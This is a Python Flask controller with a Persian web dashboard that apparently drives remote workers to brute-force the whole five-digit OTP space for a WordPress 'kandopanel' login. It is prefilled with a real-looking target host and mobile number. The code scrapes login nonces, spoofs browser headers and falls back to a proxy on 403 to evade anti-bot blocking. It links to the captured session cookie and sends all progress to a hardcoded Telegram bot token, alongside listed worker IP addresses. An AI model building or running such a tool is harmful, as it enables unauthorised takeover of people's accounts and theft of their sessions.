import requests
from flask import Flask, render_template_string, request, jsonify
from flask_socketio import SocketIO, emit
import threading
import time
from bs4 import BeautifulSoup
import logging
from collections import deque

# ==============================================================================
# Configuration
# ==============================================================================

app = Flask(__name__)
socketio = SocketIO(app)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- Telegram Configuration ---
TELEGRAM_BOT_TOKEN = "6374641003:AAFG0isVhi6pxBzZDythU96FaTrtEiVQIHY"
TELEGRAM_CHAT_ID = "-4796694839"

# --- Remote Worker Servers ---
REMOTE_SERVERS = [
    "http://23.95.197.222:5000",
    "http://198.12.88.145:5000",
    "http://192.227.134.68:5000",
]

# --- Default OTP Code Ranges for Full Scan ---
FULL_SCAN_RANGES = [
    (0, 33333),
    (33333, 66666),
    (66666, 99999),
]

# ==============================================================================
# Global State
# ==============================================================================

class AppState:
    def __init__(self):
        self.progress_log = []
        self.found_success = False
        self.success_codes = []
        self.proxy_setting = ""
        self.current_operation = {}
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        # Use a deque for history to automatically manage size
        self.history = deque(maxlen=10)

    def reset(self):
        with self.lock:
            self.progress_log.clear()
            self.found_success = False
            self.success_codes.clear()
            self.current_operation = {}
            self.stop_event.clear()

    def add_log(self, message):
        with self.lock:
            self.progress_log.append(message)
        logging.info(message)
        # Only send telegram message if token and chat_id are set
        if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
            send_to_telegram(message)
        socketio.emit('update_progress', {'log': message})
        
    def add_to_history(self, operation_details):
        with self.lock:
            # Avoid adding duplicates
            if not any(h['host'] == operation_details['host'] and h['mobile'] == operation_details['mobile'] for h in self.history):
                self.history.appendleft(operation_details)

    def set_success(self, server, code):
        with self.lock:
            if self.found_success:
                return
            self.found_success = True
            self.success_codes.append({
                "server": server,
                "code": code,
                "cookie_link": f"{server}/last_cookie"
            })
            self.stop_event.set()

app_state = AppState()

# ==============================================================================
# Helper Functions
# ==============================================================================

def send_to_telegram(message):
    """Sends a message to the configured Telegram chat."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        response = requests.post(url, json=payload, timeout=10)
        response.raise_for_status()
        return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to send Telegram message: {e}")
        return False

def fetch_nonce(host, mobile):
    """Fetches nonce using a session and realistic headers to bypass anti-bot measures."""
    try:
        use_proxy = False
        base_proxy_url = "https://go.tensha.ir/proxy/https://"
        
        # Using a session to persist cookies and headers
        session = requests.Session()
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })

        def get_url(base_url):
            return base_proxy_url + base_url.replace('https://', '') if use_proxy else base_url

        login_page_url = f"https://{host}/login/"
        
        try:
            response = session.get(login_page_url, timeout=15)
            response.raise_for_status()
        except requests.exceptions.HTTPError as e:
            if e.response.status_code == 403:
                app_state.add_log(f"⚠️ 403 Forbidden on {login_page_url}. Retrying with proxy.")
                use_proxy = True
                proxied_url = get_url(login_page_url)
                app_state.add_log(f"🔄 Using proxy URL: {proxied_url}")
                response = session.get(proxied_url, timeout=25)
                response.raise_for_status()
            else:
                raise

        soup = BeautifulSoup(response.text, 'html.parser')
        user_login_nonce = soup.find('input', {'id': 'user_login_nonce'})['value']

        ajax_url = f"https://{host}/wp-admin/admin-ajax.php"
        session.headers.update({
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Referer": login_page_url
        })
        login_data = f"user_login_nonce={user_login_nonce}&_wp_http_referer=%2Flogin%2F&action=kandopanel_user_login&redirect=&log={mobile}&pwd=&otp=1"
        session.post(get_url(ajax_url), data=login_data, timeout=20)

        otp_page_url = f"https://{host}/login/?action=login-by-otp&mobile={mobile}"
        response = session.get(get_url(otp_page_url), timeout=20)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')
        
        login_otp_nonce = soup.find('input', {'id': 'login_otp_nonce'})['value']
        app_state.add_log(f"✅ Nonce fetched successfully for {host}" + (" (using proxy)" if use_proxy else ""))
        return login_otp_nonce
    except Exception as e:
        app_state.add_log(f"❌ Failed to fetch nonce for {host}: {e}")
        return None

def send_to_remote_worker(server_url, payload):
    try:
        requests.post(f"{server_url}/start", json=payload, timeout=10).raise_for_status()
        app_state.add_log(f"✅ Request sent to {server_url} for range {payload['startRange']}-{payload['endRange']}")
    except requests.exceptions.RequestException as e:
        app_state.add_log(f"❌ Failed to send request to {server_url}: {e}")

def stop_all_workers(manual_stop=False):
    if manual_stop:
        app_state.stop_event.set()
        app_state.add_log("🛑 Manual stop requested by user.")
    for server in REMOTE_SERVERS:
        try:
            requests.post(f"{server}/stop", timeout=5)
            logging.info(f"⏹️ Stop request sent to {server}")
        except requests.exceptions.RequestException:
            pass

def get_workers_status():
    status_data = {}
    threads = []
    def check_server(server):
        try:
            response = requests.get(f"{server}/status", timeout=5)
            status = response.json()
            status_data[server] = status
            if status.get("error") and "found successfully" in status["error"]:
                code = status["error"].split("Code ")[1].split(" found")[0]
                app_state.add_log(f"🎉 Success on {server}! Code: {code}.")
                app_state.set_success(server, code)
                stop_all_workers()
        except requests.exceptions.RequestException as e:
            status_data[server] = {"running": False, "current_range": {"start": "-", "end": "-"}, "processed": "-", "error": f"Connection failed"}
    for server in REMOTE_SERVERS:
        thread = threading.Thread(target=check_server, args=(server,))
        threads.append(thread)
        thread.start()
    for thread in threads: thread.join()
    return status_data

# ==============================================================================
# Background Task Manager
# ==============================================================================

def operation_manager(operation_details):
    app_state.add_log("🔄 Operation Manager Started.")
    for attempt in range(1, 4):
        if app_state.stop_event.is_set():
            app_state.add_log("Operation cancelled.")
            break
        app_state.add_log(f"🚀 Starting attempt #{attempt}...")
        threads = [threading.Thread(target=send_to_remote_worker, args=(REMOTE_SERVERS[i], {**operation_details, 'startRange': r[0], 'endRange': r[1]})) for i, r in enumerate(operation_details['ranges'])]
        for t in threads: t.start()
        for t in threads: t.join()
        stopped = app_state.stop_event.wait(timeout=40 * 60)
        if stopped:
            app_state.add_log("✅ Operation finished or stopped." if app_state.found_success else "⏹️ Operation stopped manually.")
            break
        else:
            app_state.add_log("⏳ Timeout reached. Restarting.")
            stop_all_workers()
            time.sleep(5)
            new_nonce = fetch_nonce(operation_details['host'], operation_details['mobile'])
            if new_nonce:
                operation_details['nonce'] = new_nonce
            else:
                app_state.add_log("❌ Failed to get new nonce. Aborting.")
                break
    app_state.add_log("🔚 Operation Manager Finished.")
    stop_all_workers()

# ==============================================================================
# Flask Routes
# ==============================================================================

@app.route('/')
def index():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="fa" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>سرور مرکزی OTP</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
        <style>
            body { font-family: 'Vazirmatn', sans-serif; }
            @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
            .status-active { color: #10B981; } .status-inactive { color: #EF4444; }
        </style>
    </head>
    <body class="bg-gray-900 text-gray-200 p-4 sm:p-8">
        <div class="max-w-7xl mx-auto">
            <header class="text-center mb-8">
                <h1 class="text-4xl font-bold text-cyan-400">سرور مرکزی OTP</h1>
                <p class="text-gray-400 mt-2">مدیریت و نظارت بر فرآیند بررسی کد</p>
            </header>

            <main class="grid grid-cols-1 lg:grid-cols-3 gap-8">
                <!-- Left Column: Control & History -->
                <div class="lg:col-span-1 space-y-8">
                    <!-- Control Panel -->
                    <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                        <h2 class="text-2xl font-bold mb-6 border-b-2 border-cyan-500 pb-2">پنل کنترل</h2>
                        <form id="control-form" class="space-y-4">
                            <!-- Form inputs -->
                            <div><label for="host" class="block text-sm font-medium text-gray-300">هاست</label><input type="text" id="host" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" value="famix.ir"></div>
                            <div><label for="mobile" class="block text-sm font-medium text-gray-300">شماره موبایل</label><input type="text" id="mobile" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" value="09333221519"></div>
                            <div><label for="nonce" class="block text-sm font-medium text-gray-300">Nonce (اختیاری)</label><input type="text" id="nonce" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" placeholder="خودکار دریافت می‌شود"></div>
                            <div><label for="connections" class="block text-sm font-medium text-gray-300">تعداد کانکشن‌ها</label><input type="number" id="connections" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" value="20"></div>
                            <div><label for="proxy" class="block text-sm font-medium text-gray-300">پروکسی (SOCKS5)</label><input type="text" id="proxy" class="mt-1 block w-full bg-gray-700 border-gray-600 rounded-md shadow-sm p-2" placeholder="socks5://user:pass@host:port"></div>
                            <fieldset><legend class="block text-sm font-medium text-gray-300 mb-2">نوع اسکن</legend><div class="flex items-center space-x-4 space-x-reverse"><label><input type="radio" name="scan_type" value="full" class="form-radio text-cyan-500" checked> کامل</label><label><input type="radio" name="scan_type" value="custom" class="form-radio text-cyan-500"> سفارشی</label></div></fieldset>
                            <div id="custom_range_container" class="hidden grid grid-cols-2 gap-4"><input type="number" id="start_range" class="w-full bg-gray-700 border-gray-600 rounded-md p-2" placeholder="شروع"><input type="number" id="end_range" class="w-full bg-gray-700 border-gray-600 rounded-md p-2" placeholder="پایان"></div>
                            <div class="pt-4 space-y-3"><button type="button" id="start-btn" class="w-full flex justify-center items-center bg-green-600 hover:bg-green-700 text-white font-bold py-2 px-4 rounded-lg transition-colors">شروع</button><button type="button" id="stop-btn" class="w-full flex justify-center items-center bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg transition-colors" disabled>توقف</button></div>
                        </form>
                    </div>
                    <!-- History Panel -->
                    <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                        <h2 class="text-2xl font-bold mb-4">تاریخچه</h2>
                        <div id="history-body" class="space-y-3">
                            <p class="text-gray-400">تاریخچه‌ای موجود نیست.</p>
                        </div>
                    </div>
                </div>

                <!-- Right Column: Status & Logs -->
                <div class="lg:col-span-2 space-y-8">
                    <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                        <h2 class="text-2xl font-bold mb-4">وضعیت سرورها</h2>
                        <div class="overflow-x-auto"><table class="w-full text-center"><thead class="border-b border-gray-600"><tr><th class="py-2 px-3">سرور</th><th class="py-2 px-3">وضعیت</th><th class="py-2 px-3">رنج</th><th class="py-2 px-3">پیشرفت</th><th class="py-2 px-3">آخرین پیام</th></tr></thead><tbody id="status-body"></tbody></table></div>
                    </div>
                    <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                        <h2 class="text-2xl font-bold mb-4">کدهای موفق</h2>
                        <div id="success-body" class="space-y-2"><p class="text-gray-400">هنوز کدی یافت نشده است.</p></div>
                    </div>
                    <div class="bg-gray-800 p-6 rounded-xl shadow-lg">
                         <h2 class="text-2xl font-bold mb-4">لاگ‌ها</h2>
                         <div id="logs-container" class="h-80 overflow-y-auto bg-gray-900 rounded-md p-2 space-y-1 text-sm font-mono"></div>
                    </div>
                </div>
            </main>
        </div>

        <script>
            const socket = io();
            const startBtn = document.getElementById('start-btn');
            const stopBtn = document.getElementById('stop-btn');
            const statusBody = document.getElementById('status-body');
            const successBody = document.getElementById('success-body');
            const logsContainer = document.getElementById('logs-container');
            const historyBody = document.getElementById('history-body');

            function setButtonState(isBusy) {
                startBtn.disabled = isBusy;
                stopBtn.disabled = !isBusy;
                startBtn.classList.toggle('opacity-50', isBusy);
                stopBtn.classList.toggle('opacity-50', !isBusy);
            }

            function addLog(message) {
                const logEntry = document.createElement('p');
                logEntry.textContent = `> ${message}`;
                logsContainer.appendChild(logEntry);
                logsContainer.scrollTop = logsContainer.scrollHeight;
            }

            function updateHistoryTable(historyData) {
                historyBody.innerHTML = '';
                if (!historyData || historyData.length === 0) {
                    historyBody.innerHTML = '<p class="text-gray-400">تاریخچه‌ای موجود نیست.</p>';
                    return;
                }
                historyData.forEach((item, index) => {
                    const historyEntry = document.createElement('div');
                    historyEntry.className = 'bg-gray-700 p-3 rounded-lg flex justify-between items-center';
                    historyEntry.innerHTML = `
                        <div>
                            <p class="font-bold">${item.host}</p>
                            <p class="text-sm text-gray-400 font-mono">${item.mobile}</p>
                        </div>
                        <button data-index="${index}" class="resend-btn bg-cyan-600 hover:bg-cyan-700 text-white font-bold py-1 px-3 rounded-lg transition-colors">ارسال مجدد</button>
                    `;
                    historyBody.appendChild(historyEntry);
                });
            }

            async function refreshData() {
                try {
                    const [statusRes, successRes, historyRes] = await Promise.all([
                        fetch('/get_status'),
                        fetch('/get_success'),
                        fetch('/get_history')
                    ]);
                    const statusData = await statusRes.json();
                    const successData = await successRes.json();
                    const historyData = await historyRes.json();

                    updateStatusTable(statusData);
                    updateSuccessList(successData);
                    updateHistoryTable(historyData);
                    
                    const isAnyRunning = Object.values(statusData).some(s => s.running);
                    setButtonState(isAnyRunning);
                } catch (error) {
                    console.error("Error refreshing data:", error);
                }
            }
            
            function updateStatusTable(statusData) {
                statusBody.innerHTML = '';
                Object.keys(statusData).forEach(server => {
                    const status = statusData[server];
                    const processed = parseInt(status.processed) || 0;
                    const end = parseInt(status.current_range.end) || 0;
                    const start = parseInt(status.current_range.start) || 0;
                    const total = end > start ? end - start : 0;
                    const percentage = total > 0 ? (((processed - start) / total) * 100).toFixed(1) : 0;
                    const row = document.createElement('tr');
                    row.className = 'border-b border-gray-700 last:border-none';
                    row.innerHTML = `
                        <td class="py-3 px-2 whitespace-nowrap">${new URL(server).hostname}</td>
                        <td class="py-3 px-2 font-bold ${status.running ? 'status-active' : 'status-inactive'}">${status.running ? 'فعال' : 'غیرفعال'}</td>
                        <td class="py-3 px-2 font-mono">${status.current_range.start} - ${status.current_range.end}</td>
                        <td class="py-3 px-2"><div class="w-full bg-gray-600 rounded-full h-2.5"><div class="bg-cyan-500 h-2.5 rounded-full" style="width: ${percentage}%"></div></div><span class="text-xs font-mono">${percentage}%</span></td>
                        <td class="py-3 px-2 text-xs text-gray-400 max-w-xs truncate">${status.error || '-'}</td>
                    `;
                    statusBody.appendChild(row);
                });
            }
            
            function updateSuccessList(successData) {
                if (!successData || successData.length === 0) {
                    successBody.innerHTML = '<p class="text-gray-400">هنوز کدی یافت نشده است.</p>';
                    return;
                }
                successBody.innerHTML = '';
                successData.forEach(s => {
                    const successEntry = document.createElement('div');
                    successEntry.className = 'bg-green-500/20 p-3 rounded-lg';
                    successEntry.innerHTML = `<p class="font-bold">کد: <span class="font-mono text-cyan-300">${s.code}</span></p><p class="text-sm">سرور: ${new URL(s.server).hostname}</p><a href="${s.cookie_link}" target="_blank" class="text-yellow-400 hover:underline">دانلود کوکی</a>`;
                    successBody.appendChild(successEntry);
                });
            }

            // Event Listeners
            document.querySelector('input[name="scan_type"][value="custom"]').addEventListener('change', () => document.getElementById('custom_range_container').classList.remove('hidden'));
            document.querySelector('input[name="scan_type"][value="full"]').addEventListener('change', () => document.getElementById('custom_range_container').classList.add('hidden'));

            startBtn.addEventListener('click', async () => {
                setButtonState(true);
                const payload = {
                    host: document.getElementById('host').value, nonce: document.getElementById('nonce').value,
                    mobile: document.getElementById('mobile').value, connections: parseInt(document.getElementById('connections').value),
                    proxy: document.getElementById('proxy').value, scan_type: document.querySelector('input[name="scan_type"]:checked').value,
                    start_range: document.getElementById('start_range').value, end_range: document.getElementById('end_range').value,
                };
                try {
                    const response = await fetch('/start', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
                    if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                } catch (error) {
                    addLog(`خطا در ارسال درخواست: ${error.message}`); setButtonState(false);
                }
            });

            stopBtn.addEventListener('click', () => fetch('/stop', { method: 'POST' }));
            
            historyBody.addEventListener('click', async (e) => {
                if (e.target.classList.contains('resend-btn')) {
                    const index = e.target.dataset.index;
                    setButtonState(true);
                    addLog(`ارسال مجدد عملیات از تاریخچه #${index}...`);
                    try {
                        const response = await fetch(`/resend/${index}`, { method: 'POST' });
                        if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                    } catch (error) {
                        addLog(`خطا در ارسال مجدد: ${error.message}`); setButtonState(false);
                    }
                }
            });

            socket.on('update_progress', (data) => addLog(data.log));
            setInterval(refreshData, 3000);
            refreshData();
        </script>
    </body>
    </html>
    ''')

def start_operation_thread(operation_details, is_from_history=False):
    """Prepares and starts the operation manager in a new thread."""
    if not is_from_history:
        app_state.add_to_history(operation_details)
    
    app_state.reset()
    app_state.current_operation = operation_details
    app_state.proxy_setting = operation_details.get('proxy', '')

    host = operation_details['host']
    mobile = operation_details['mobile']
    
    app_state.add_log(f"🚀 Operation initiated for host: {host}, mobile: {mobile}")

    nonce = operation_details.get('nonce')
    if not nonce:
        app_state.add_log("Nonce not provided, fetching automatically...")
        nonce = fetch_nonce(host, mobile)
        if not nonce:
            app_state.add_log("Failed to start: Could not fetch nonce.")
            return
        operation_details['nonce'] = nonce

    threading.Thread(target=operation_manager, args=(operation_details,)).start()

@app.route('/start', methods=['POST'])
def start_new_operation():
    if app_state.current_operation.get('is_running'):
        return jsonify({"error": "An operation is already in progress."}), 409
    data = request.get_json()
    scan_type = data.get('scan_type', 'full')
    if scan_type == 'full':
        ranges = FULL_SCAN_RANGES
    else:
        try:
            start_r, end_r = int(data['start_range']), int(data['end_range'])
            chunk_size = (end_r - start_r) // len(REMOTE_SERVERS)
            ranges = [(start_r + i * chunk_size, start_r + (i + 1) * chunk_size -1) for i in range(len(REMOTE_SERVERS)-1)]
            ranges.append((start_r + (len(REMOTE_SERVERS)-1)*chunk_size, end_r))
        except (ValueError, TypeError):
            return jsonify({"error": "Invalid custom range."}), 400
    
    operation_details = {
        'host': data['host'], 'mobile': data['mobile'], 'nonce': data.get('nonce'),
        'connections': int(data['connections']), 'proxy': data.get('proxy'),
        'ranges': ranges, 'is_running': True
    }
    start_operation_thread(operation_details)
    return jsonify({"message": "Operation started."}), 202

@app.route('/resend/<int:index>', methods=['POST'])
def resend_from_history():
    if app_state.current_operation.get('is_running'):
        return jsonify({"error": "An operation is already in progress."}), 409
    with app_state.lock:
        if index >= len(app_state.history):
            return jsonify({"error": "Invalid history index."}), 404
        operation_details = app_state.history[index].copy()
    
    # Force refetch of nonce by removing the old one
    operation_details.pop('nonce', None)
    start_operation_thread(operation_details, is_from_history=True)
    return jsonify({"message": "Resend operation started."}), 202

@app.route('/stop', methods=['POST'])
def stop_operation():
    stop_all_workers(manual_stop=True)
    with app_state.lock:
        if 'is_running' in app_state.current_operation:
            app_state.current_operation['is_running'] = False
    return jsonify({"message": "Stop signal sent."}), 200

@app.route('/get_status', methods=['GET'])
def get_status():
    return jsonify(get_workers_status())

@app.route('/get_success', methods=['GET'])
def get_success():
    with app_state.lock:
        return jsonify(list(app_state.success_codes))

@app.route('/get_history', methods=['GET'])
def get_history():
    with app_state.lock:
        return jsonify(list(app_state.history))

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5001, debug=False, allow_unsafe_werkzeug=True)
